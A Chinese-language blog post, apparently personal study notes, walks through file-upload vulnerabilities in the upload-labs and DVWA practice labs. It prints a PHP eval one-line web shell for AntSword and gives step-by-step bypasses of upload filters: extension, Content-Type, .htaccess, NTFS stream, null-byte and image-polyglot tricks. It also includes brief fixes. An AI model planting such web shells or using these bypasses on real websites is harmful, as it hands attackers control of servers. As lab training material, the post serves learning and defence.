+++
title = "文件上传漏洞笔记"
description = ""
date = 2023-07-31T20:59:37+08:00
featured = false
comment = true
toc = true
reward = true
categories = [
  ""
]
tags = [
  "渗透测试","upload-labs"
]
series = []
images = []
+++

## 00-文件上传简介
upload-labs 靶场 [c0ny1/upload-labs](https://github.com/c0ny1/upload-labs) 

蚁剑  [第一个Shell (yuque.com)](https://www.yuque.com/antswordproject/antsword/qg3g73)

文件上传通常要上传如 php asp 这种文件，服务器在你访问上传的文件后，对文件进行解析/执行。

比如你上传了xxx.php ,然后你访问这个文件，这样服务器就会执行你的代码，配合蚁剑你就可以控制整个网站的文件内容。

upload-labs  打法这里还有个博客，[(34条消息) upload-labs通关大全（已完结）_仙女象的博客-CSDN博客](https://blog.csdn.net/elephantxiang/article/details/120660685?spm=1001.2014.3001.5502)

### php 例子

为了理解文件上传，请搭建phpstudy环境，自己运行下面的 html 和 php

```html
<form action="upload.php" method="post" enctype="multipart/form-data">
	<label for="file">Filename:</label>
	<input type="file" name="file" id="file" />
	<br />
	<input type="submit" name="submit" value="Submit" />
</form>
```

`<form action="upload.php"` 这里的 `upload.php` 可以修改成任何网址，对其他网站进行上传。

`enctype="multipart/form-data"` 这句保留，表示上传为二进制格式。



### 文件上传代码

`$_FILES["file"]["error"]` == 0 时代表正常无错误
- 0; 没有错误发生，文件上传成功。
- 1; 上传的文件超过了php.ini 中upload_max_filesize 选项限制的值。
- 2; 上传文件的大小超过了HTML 表单中MAX_FILE_SIZE 选项指定的值。
- 3; 文件只有部分被上传。
- 4; 没有文件被上传。
如果正常上传后会把文件各种属性和 放置位置 打印。

```php
<?php
if ($_FILES["file"]["error"] > 0) {
    echo "Error: " . $_FILES["file"]["error"] . "<br />";
} else {
    echo "Upload: " . $_FILES["file"]["name"] . "<br />";
    echo "Type: " . $_FILES["file"]["type"] . "<br />";
    echo "Size: " . ($_FILES["file"]["size"] / 1024) . " Kb<br />";
    echo "Stored in: " . $_FILES["file"]["tmp_name"];
}
```


### 文件上传的分类

- 任意文件上传漏洞 / 直接文件上传漏洞 （高危）
- 有条件的上传漏洞
- 权限认证没处理
- 上传逻辑有问题
- 中间件或者系统特性上传

如果攻击者能直接上传恶意脚本到网站存放的目录，且这个目录可解析动态脚本语言，那么攻击者就能够直接获取网站权限

### 文件上传漏洞的修复方案
- 在网站中需要存在上传模块，需要做好权限认证，不能让匿名用户可访问。
- 文件上传目录设置为禁止脚本文件执行。这样设置即使被上传后门的动态脚本也不能解析，导致攻击者放弃这个攻击途径。
- 设置上传白名单，白名单只允许图片上传如，jpg png gif 其他文件均不允许上传
- 上传的后缀名，一定要设置成图片格式如 jpg png gif

---

## 01-使用蚁剑
- 下载 https://github.com/AntSwordProject/AntSword-Loader/releases
- 安装的时候他会下载github文件并解压，如果卡住了就自行解压然后重新选择那个目录。
- 参考教程： 蚁剑  [第一个Shell (yuque.com)](https://www.yuque.com/antswordproject/antsword/qg3g73)
- 上传文件
	- 因为ant总被火绒拦掉所以…… 我改成了Post  ”ass“
	- 上传文件内容：
	```
	<?php eval($_POST['ass']);
	```
- 新建站点
![Imgur](https://i.imgur.com/AiuKhN0.png)
	
- 可以修改/删除/浏览 web站点的所有文件。
![Imgur](https://i.imgur.com/sLFw53X.png)

---

## 01-DVWA - upload file
### 先看一下源代码

vulnerabilities/upload/source/low.php

如果接收到了上传请求，代码会将上传文件保存到指定的目录中。

```php
<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    // Where are we going to be writing to?
    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );

    // Can we move the file to the upload folder?
    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
        // No
        echo '<pre>Your image was not uploaded.</pre>';
    }
    else {
        // Yes!
        echo "<pre>{$target_path} succesfully uploaded!</pre>";
    }
}

?> 
```

### 上传一个phpinfo

上传phpinfo是为了非暴力测试，攻击的话要用一句话。
如果phpinfo执行了，Post其实也大差不差。

要上传的 php 的内容为
```php
<?php phpinfo();
```


---


## 02- 绕过js文件类型检查
> 适用范围：网站仅仅通过前端js代码进行文件后缀名检测
> 
Pass-01

### 方法1 修改html

1. 打开 F12 ，修改form 的 onsubmit ，删除 checkFile() 函数
2. 重新上传php文件

```html
<form enctype="multipart/form-data" method="post" onsubmit="return checkFile()">
                <p>请选择要上传的图片：</p><p>
                <div id="msg">
                            </div><input class="input_file" type="file" name="upload_file">
                <input class="button" type="submit" name="submit" value="上传">
            </p></form>
```

### 方法2 抓包替换后缀名

1. 选择 1.jpg 文件上传（文件内容是php代码）
2. 用抓包工具修改后post内容的文件后缀名（这时候payload 已经通过了js校验）

![Imgur](https://i.imgur.com/ofmgpwh.png)

---

## 04-绕过content-type
> 适用范围：网站后台代码对上传文件de content-type 进行校验


关键语句（php会对content-type进行验证）：

```php
if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif'))
```

### 使用burp绕过

Pass-02

为了方便观察，我们打开upload lab 的 上传存储文件夹 `C:\phpstudy_pro\WWW\upload`

常见的媒体格式类型如下：
更多参考 runoob [HTTP content-type | 菜鸟教程 (runoob.com)](https://www.runoob.com/http/http-content-type.html)

      - text/html ： HTML格式
      - text/plain ：纯文本格式
      - text/xml ： XML格式
      - image/gif ：gif图片格式
      - image/jpeg ：jpg图片格式
      - image/png：png图片格式

1. 上传1.php文件
2. 开启抓包，修改文件的 content-type 字段为  image/jpeg
3. 放行包
![Imgur](https://i.imgur.com/w1QMd8h.png)

---

## 05-绕过简单黑名单
> 适用范围：黑名单，后缀限制较少


如果出现这种提示：不允许上传.asp,.aspx,.php,.jsp后缀文件，则可以判断是黑名单上传。

对于iis：
可以上传 asa \ cer \ cdx 这些

对于apache:
可以上传 phtml \ php3 这些

Pass03

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        //这里开始下面一大块就是获取后缀名然后tolower
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

---

## 06-.htaccess文件重写攻击

> 适用范围：黑名单没有限制 .htaccess， Apache专用



1. 上传 1.jpg 文件
2. 上传 .htaccess 文件
3. 访问 jpg 上传后的位置，发现已经执行了里面的php代码


.htaccess 是一个apache的配置文件，可以修改apache服务器处理文件的行为

比如我们制作一个攻击用 .htaccess 文件内容如下：

```xml
<FilesMatch "jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

这样你访问jpg文件目录的时候，他就会把你上传 的 jpg 当作 php 来执行了。

---

## 07-大小写绕过
> 适用范围：黑名单，php早期版本，5.x


有的上传使用黑名单，且未对大小写进行严格判断：

这时候可尝试上传 `xxx .phP` , 但是貌似对于新的php版本无效。

---

## 08-空格绕过、windows服务器点绕过

> 适用范围：黑名单，php5.x，后端未对空格过滤 ，服务器采用windows系统

### 空格绕过

Pass-06 
Pass-07
1. 上传1.php
2. 抓包，改写文件名为 `1.php<空格> `
3. 放行，上传成功


> 发现一个问题，就是我一开始用了 小皮面板，php版本：7.3.4 ，无法成功。
> 
> 但是后面用了按月给的那个环境，php：5.2.17 可复现。
> 
> 所以版本比较高的没用。

### windows服务器点绕过

如果对方的后端使用的是Windows， Windows系统会在把文件复制到上传文件夹的时候自动删除文件末尾的点 ， 比如你传 `1.php.` 通过了验证 ,然后Windows把它给挪到上传文件夹后就自动变成 `1.php`

1. 上传 `1.php`
2. 抓包，改写文件名为 `1.php. `
3. 放行，上传成功 

---


## 09-NTFS数据流绕过 DATA

> 适用范围：windows NTFS ，黑名单，对::$DATA 字符串未做限制 

    我是win系统，但是硬盘使用了extFAT格式，所以一直不成功。
    然后我重启这个phpstudy环境，把整个WWW文件位置挪到了NTFS格式硬盘的桌面上，
    还是不行，最后发现要在phpStudy设置中-设置新的网站目录

**Pass-08**

**方法：**
抓包，文件名+"::$DATA" 上传，可用绕过后缀检测

### 数据流知识

> 下面是经过我修改得的GPT回复，可用用来浅浅的了解下NTFS数据流。
>

NTFS数据流是指在NTFS文件系统中，一个文件可以包含多个数据流（Alternate Data Streams，ADS）。每个数据流可以存储额外的数据，与文件的主数据流相互独立，但在一般情况下是不可见的。

对于普通用户而言，操作NTFS数据流可能需要一些高级的技术和工具。然而，以下是一种简单的方法来操作NTFS数据流：

1. 创建一个新的文本文件，例如"test.txt"。
2. 打开命令提示符（CMD）。
3. 使用以下命令创建一个新的数据流并写入数据：  
          `echo This is a hidden message > test.txt:hidden.txt`  
       这个命令将在"test.txt"文件中创建一个名为"hidden.txt"的数据流，并将"This is a hidden message"写入该数据流。
4. 使用以下命令查看文件中的所有数据流：  
          `dir /r test.txt`  
       这个命令将显示"test.txt"文件以及它的所有数据流。
5. 使用以下命令读取数据流的内容：  
          `more < test.txt:hidden.txt`  
       这个命令将显示"hidden.txt"数据流中的内容。

请注意，以上方法仅适用于在Windows命令提示符下进行简单的操作。

---

我理解，数据流就是NTFS系统中的一种隐藏文件，这玩意可有一个宿主文件。宿主文件删了，数据流就跟着没了。

---

## 10-windows 叠加特征上传
Pass-09

> 适用范围：windows NTFS ，黑名单，对 尖括号没有限制的情况

1. 上传 `s.jpg` 文件，文件名用 burp 修改： 
```
s.php:s.jpg
```
> 这时候系统就会通过校验，因为后缀名是jpg，但是因为文件流，实际上 s.jpg 将会不可见。并且会新建一个 s.php 文件（空文件）

2. 上传 1.php 文件，抓包修改名称 为 `s.>>>` 代表 `s.???` ，会正则匹配到刚才创建的 s.php 。 然后系统会把他的内容变成你新上传的内容。

3. 打开 ： http://localhost/upload/s.php 即可发现上传成功


文件名匹配规则：
```
  双引号" 等于 点号.
  大于符号> 等于 问号?
  小于符号< 等于 星号*

```

---

## 11-双写文件名

Pass-10
> 适用范围：黑名单，上传后端使用关键字删除
> 如上传 `1.php` ， 实际会上传文件 `1.` 到目录的情况

1. 抓包修改文件名称为 `1.pphphp` （在php外面夹着一个p hp，其他类型文件同理，只要过滤器做的比较垃圾就会成功绕过）
2. 查看发现上传成功

---

## 12-上传参数目录可控

> 适用范围：php<5.3.4 ， 未开启gpc , 使用%00 

### Get 方式
Pass-11

> 客户端可以控制上传路径，如 url中有如下类似字串  `?save_path=../upload/`
```php
$img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
```
> 正常上传会产生 一个上传目录：`../upload/039840198431.jpg`

1. 上传jpg文件
2. 抓包修改请求头为 `?save_path=../upload/1.php%00`  
3. 这样上传路径变成 `../upload/1.php%00039840198431.jpg` ， 然后php 保存的时候把 %00 后面的东西都忽略了，就把文件保存成 1.php 了
4. 访问 http://localhost/upload/1.php 成功

### Post 方式
Pass-12

php后端源码改用了 post 方式获取 savepath，这时候同样可以使用 %00 但是要进行url解码。
```php
 $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;
```
1. 上传jpg文件
2. 抓包修改post 内容 

```
Content-Disposition: form-data; name="save_path"

../upload/2.php%00
```

4. 选择 `%00` 按下 `ctrl + shift + u` 进行俩 decode ， 然后放行 (%00 会变成一个空的方框一样的东西)
5. 访问 http://localhost/upload/1.php 成功

---

## 13-文件头检测绕过
之前的章节一直是用后缀名限制，并且是黑名单，属于较容易绕过的上传漏洞。
从这里开始的Pass基本上都是白名单了。


Pass-13
> 适用范围：采用文件魔数字（文件头的两个字节）判断文件类型的检测
> 上传的图片木马需要借助 [文件包含漏洞](http://localhost/include.php) 才能正常运行

常见的文件头参考表（HEX格式） [51CTO博客_](https://blog.51cto.com/u_2982693/3354695)
-  JPEG (jpg)，文件头：FFD8FF
-  PNG (png)，文件头：89504E47
这些都是16进制文件头，可以使用 [From Hex - CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')) 尝试在线解码 ，比如 jpg 解码后是 `ÿØÿ` 但一般这种乱码都不好用，比较推荐利用gif文件，gif的头`47 49 46 38`解码后是 `GIF8`  ，可以轻松使用burp上传。

获取文件头还有一种简单的方式，就是找到一个文件，用记事本打开，然后复制第一个单词之类的

制作图片马 有两种方式，一种是基于真正的图片，一种是抓包修改头部，让服务器以为自己收到的是图片。

### 基于真正的图片法

打开cmd ，准备好 1.gif 和  1.php ，执行下方代码：

```c
copy 1.gif/b+1.php ma.gif
```

制作好`ma.gif`之后，用记事本打开，可以发现，相当于在 原版的 `1.gif` 尾部，追加了 `<?php phpinfo();?>` 。
1. 上传`ma.gif`
2. 获取上传后路径 http://localhost/upload/1020230731134955.gif ， 路径为 `upload/1020230731134955.gif`
3. 与文件包含漏洞 http://localhost/include.php 组合 
4. 访问 http://localhost/include.php?file=upload/1020230731134955.gif 图片马执行。

### 抓包修改头部法

1. 上传 1.php
2. 抓包修改
原包
```
-----------------------------30629768524726476051439622056
Content-Disposition: form-data; name="upload_file"; filename="1.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
```
修改后(修改了文件后缀名和包内容前面部分)

```
-----------------------------30629768524726476051439622056
Content-Disposition: form-data; name="upload_file"; filename="1.gif"
Content-Type: application/octet-stream

GIF8<?php phpinfo();?>
```
3. 截获返回包，搜索`../upload`  搜索到上传位置 ：/upload/8320230731140148.gif
4. 与文件包含漏洞 http://localhost/include.php 组合 
5. 访问 http://localhost/include.php?file=upload/8320230731140148.gif 图片马执行。

## 14-绕过图片二次渲染
Pass-16
> 适用范围：图片上传后会进行压缩，压缩后可能会损坏php后门的情况
> 上传的图片木马需要借助 [文件包含漏洞](http://localhost/include.php) 才能正常运行

解法：先正常上传文件（推荐gif，因为gif压缩比小），然获取压缩后文件，进行对比找到未压缩的部分，用php后门覆盖一小块未压缩部分的文件

使用工具：HxD Hex Editor  
如果你不想要用这个win工具，可以试试网页版Hex编辑器，但是可能会很卡顿  https://hexed.it/

1. 上传1.gif，获取上传后文件20161.gif
2. 通过使用 HxD工具进行查看和对比，发现文件前部基本无区别，覆盖修改一部分内容为 
```
<?php phpinfo();?>
```
3. 另存为 3.gif
4. 上传3.gif ，获取到上传后路径： upload/17173.gif
5. 与文件包含漏洞 http://localhost/include.php 组合 
6. 访问 http://localhost/include.php?file=upload/17173.gif  图片马执行。

## 15-文件名可控绕过


适用范围：php<5.3.4 ， 未开启gpc , 使用%00 

对于iis<6.0 ： 使用分号 1.asp;1.jpg

对于apache ，使用 .a 1.php.a (优先左解释)

斜杠法 ： 1.php/.

## 17-文件上传其他漏洞

nginx 0.83 

上传jpg文件，访问 `1.jpg%00php` ，会被当作php解析

apahce 1.x 或者 2.x

当 apache 遇见不认识的后缀名，会从后向前解析例
如 1.php.rar 不认识 rar 就向前解析，直到知道它认识的后缀名。

phpcgi 漏洞(nginx iis7 或者以上)

上传图片1.jpg。访问 1.jpg/1.php 也会解析成 php。

Apache HTTPD 换行解析漏洞（CVE-2017-15715）

apache通过 mod_php来运行脚本，其 2.4.0-2.4.29中存在apache 换行解析漏洞，上传文件名为 `xxx.php\x0A`（x0A) 是换行符
将被按照 PHP 后缀进行解析，导致绕过一些服务器的安全策略